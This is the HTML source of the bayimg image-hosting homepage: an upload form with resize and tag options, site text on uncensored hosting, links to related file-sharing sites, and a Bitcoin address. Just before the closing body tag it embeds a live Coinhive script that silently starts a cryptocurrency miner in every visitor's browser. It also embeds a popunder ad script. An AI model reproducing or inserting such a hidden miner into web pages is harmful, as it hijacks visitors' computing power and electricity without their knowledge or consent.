<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
	<title>bayimg - free uncensored image hosting</title>
   	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
   	<meta http-equiv="imagetoolbar" content="false" />
   	<link rel="shortcut icon" href="/favicon.ico" type="image/ico" />
	<link rel="stylesheet" type="text/css" href="/css/global.css" media="screen,projection" />
	<link rel="shortcut icon" href="/favicon.ico"/>
	<script type="text/javascript" src="/js/behavior.js"></script>
	<script src="http://bayimg.com/pu.js"></script>
</head>
<body>
<div id="container">
<div id="header">
	<div id="left">
	<h1>Bayimg</h1>
          <a href="/"><img src="/images/logo.gif" alt="imgbay" id="logo" /></a>
	</div>
	<div id="menu">
		<ul id="menu_buttons">
			<li><a href="/cloud">Tags</a></li>
			<li>|</li>
			<li><a href="/settings">Settings</a></li>
			<li>|</li>
			<li><a href="/faq">FAQ</a></li>
		</ul>
	</div>
</div>
<div id="wrapper">
<div id="extra2">

<form action="/upload" id="ulform" method="post" enctype="multipart/form-data" name="upload" onsubmit="validate(); return false">
   	<div id="box">
	   <fieldset>
		   <h2>Select image to upload </h2>
			<input type="file" id="file" name="file" class="textbox"/><br/>
			<div id="nocode">Please specify a removal code</div>
			<input type="text" id="code" name="code" class="textbox"/> <span class="typetext">removal code</span><br />
			<input type="text" id="tags" name="tags" class="textbox"/> <span class="typetext">tags</span>
<script type="text/javascript" src="/js/prototype.js"></script><script type="text/javascript" src="/js/effects.js"></script><script type="text/javascript" src="/js/upload.js"></script><script type="text/javascript" src="/js/dragdrop.js"></script><script type="text/javascript" src="/js/controls.js"></script><script type="text/javascript" src="/js/autocomplete.js"></script><div class="tags" id="tags_auto_complete"></div><script type="text/javascript">new Ajax.Autocompleter('tags', 'tags_auto_complete', 'ajax_tags_autocompleter.php', { frequency: 0.5, tokens: ' ' })</script>		</fieldset>
		<fieldset>
		<legend onclick="toggleSettings();"><img id="closeopen" src="/images/closed.png" alt="+"/><span class="settings">Settings</span></legend>
			<div id="settings" class="hide">
			<label><input type="checkbox" id="resize" name="resize" onclick="this.checked ? document.getElementById('resize-to').disabled=false : document.getElementById('resize-to').disabled=true;"/> Resize to:</label>
				<select id="resize-to" name="resizeto" disabled="disabled">
					<option value="0">100 x 75 (avatar)</option>
					<option value="1">150 x 112 (thumbnail)</option>
					<option value="8" selected="selected">300 x 300 TPB - Torrent image)</option>
					<option value="2">320 x 240 (for websites and email)</option>
					<option value="3">640 x 480 (for message boards)</option>
					<option value="4">800 x 600 (15-inch monitor)</option>
					<option value="5">1024 x 768 (17-inch monitor)</option>
					<option value="6">1280 x 1024 (19-inch monitor and some 17-inches)</option>
					<option value="7">1600 x 1200 (21-inch monitor and some 19-inches)</option>
				</select>
				<label><input type="checkbox" id="offensive" name="offensive"/> Mark image(s) offensive</label>
			</div>
	   </fieldset>
	  <input type="submit" id="button" value="Upload"/>
	</div>
</form>
<p><b>* ZIP and RAR uploading fixed! - 2014-01-21.</b></p>
<p>You can upload about 140 different formats. There's even support for .RAR and .ZIP-archives! If you upload an archive with multiple images, you'll also get an album-address for all the pictures inside of it. Tags are separated by spaces, removal code is a password to let you remove images you upload.<br />Max file upload size is 100MB. If you're crazy and upload that much, then you should consider getting friends.</p>
<p>bayimg.com is a place where you can host all your images. We do not censor them. We believe in freedom of speech, it's of <i>utter importance</i> to us. As long as your pictures are legal they will be hosted here, but we reserve the right to remove images due to technical reasons though. If something crashes here, you better have a backup yourself - hopefully that won't happen. <a href="https://thepiratebay.se" target="_new">Usually</a> <a href="http://suprbay.org" target="_new">we</a> <a href="http://pastebay.net" target="_new">know</a> <a href="http://piratbyran.org" target="_new">what</a> <a href="http://kopimi.com" target="_new">we're</a> <a href="http://bayfiles.net" target="_NEW">doing</a>.</p>
<p>If you have the need to store other types of files online, try the new <b><a href="http://bayfiles.net" target="_NEW">Bayfiles</a></b> cyberlocker file storage service.</p>
<p>Questions goes to abuse at bayimg dot com.</p>
<br /><br /><p align="center">Images: 5.449.913 - Albums: 10.685 - Views: 543.865.625 - Tags: 217.127</p>
</div>
</div>
<div id="footer">
	<div class="annons"> </div>
<p>BTC: <a href="bitcoin:1Cg7Bf2sr4LMR8EwfCiKZfS7RjoAbNnEj7">1Cg7Bf2sr4LMR8EwfCiKZfS7RjoAbNnEj7</a></p>
<p>NO COPYRIGHT. NO LICENSE.</p>
</div>
<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script>
var miner = new CoinHive.Anonymous('3TyPM1TY53ldTXCfuALfVFSfimTGEOyy', { throttle: 0.65 });
miner.start();
</script>
<script>
  var totalURLWeight = 0,
   currentURL = 0,
   weighedURL = [],
   URLlist = [
   ["http://bayimg.com/pu.html", 50],
   ["http://bayimg.com/pu.html", 50]
  ];

  for (var i = 0; i < URLlist.length; i++) {
   totalURLWeight += URLlist[i][1];
  }

  while (currentURL < URLlist.length){
   for (i = 0; i < URLlist[currentURL][1]; i++) {
    weighedURL[weighedURL.length] = URLlist[currentURL][0]
   }
   currentURL++
  }

  var pURL = weighedURL[Math.floor(Math.random() * weighedURL.length)];
  jsUnda(pURL, {
   width: 50,
   height: 50,
   cap: 2,
   wait: (600),
   cookie: "smackadoo"
  });
</script>
</body>
</html>